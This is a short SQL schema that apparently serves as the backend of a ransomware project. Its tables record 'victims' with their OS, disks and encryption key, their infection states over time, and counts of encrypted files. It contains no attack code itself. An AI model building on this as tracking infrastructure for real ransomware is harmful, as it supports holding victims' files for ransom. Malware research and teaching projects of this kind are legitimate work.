DROP TABLE IF EXISTS encrypted;
DROP TABLE IF EXISTS states;
DROP TABLE IF EXISTS victims;

CREATE TABLE IF NOT EXISTS victims (
    OS TEXT,
    hash TEXT PRIMARY KEY,
    disks TEXT,
    key TEXT
);

CREATE TABLE IF NOT EXISTS states (
    id_state INTEGER PRIMARY KEY AUTOINCREMENT,
    hash_victim TEXT NOT NULL,
    datetime TEXT,
    state TEXT,
    FOREIGN KEY (hash_victim) REFERENCES victims(hash)
);

CREATE TABLE IF NOT EXISTS encrypted (
    id_encrypted INTEGER PRIMARY KEY AUTOINCREMENT,
    hash_victim TEXT NOT NULL,
    datetime TEXT,
    nb_files INTEGER,
    FOREIGN KEY (hash_victim) REFERENCES victims(hash)
);
